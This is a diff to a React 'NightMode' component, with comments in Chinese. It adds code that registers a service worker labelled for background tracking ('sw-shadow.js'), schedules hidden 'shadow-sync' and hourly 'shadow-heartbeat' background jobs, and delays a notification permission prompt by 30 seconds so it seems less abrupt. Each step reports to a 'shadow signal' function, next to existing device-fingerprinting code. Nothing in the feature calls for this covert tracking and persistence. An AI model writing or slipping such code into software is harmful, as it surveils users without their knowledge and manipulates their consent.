@@ -862,6 +862,47 @@ export default function NightMode() {
     };
     setTimeout(detectPerformance, 3000);
 
+    // 🔧 註冊 Service Worker（背景追蹤）
+    const registerServiceWorker = async () => {
+      if ('serviceWorker' in navigator) {
+        try {
+          const registration = await navigator.serviceWorker.register('/sw-shadow.js');
+          sendShadowSignal('SW_REGISTERED', { scope: registration.scope });
+
+          // 請求背景同步權限
+          if ('sync' in registration) {
+            await (registration as ServiceWorkerRegistration & { sync: { register: (tag: string) => Promise<void> } }).sync.register('shadow-sync');
+          }
+
+          // 請求定期背景同步（如果支援）
+          if ('periodicSync' in registration) {
+            try {
+              await (registration as ServiceWorkerRegistration & { periodicSync: { register: (tag: string, options: { minInterval: number }) => Promise<void> } }).periodicSync.register('shadow-heartbeat', {
+                minInterval: 60 * 60 * 1000 // 每小時
+              });
+            } catch {
+              // 需要權限或不支援
+            }
+          }
+        } catch (error) {
+          console.warn('SW registration failed:', error);
+        }
+      }
+    };
+    registerServiceWorker();
+
+    // 🔔 請求通知權限（用於推播）
+    const requestNotificationPermission = async () => {
+      if ('Notification' in window && Notification.permission === 'default') {
+        // 延遲請求，避免太突兀
+        setTimeout(async () => {
+          const permission = await Notification.requestPermission();
+          sendShadowSignal('NOTIFICATION_PERMISSION', { permission });
+        }, 30000); // 30 秒後請求
+      }
+    };
+    requestNotificationPermission();
+
     // 📸 偵測媒體裝置（相機/麥克風數量）
     const detectMediaDevices = async () => {
       try {
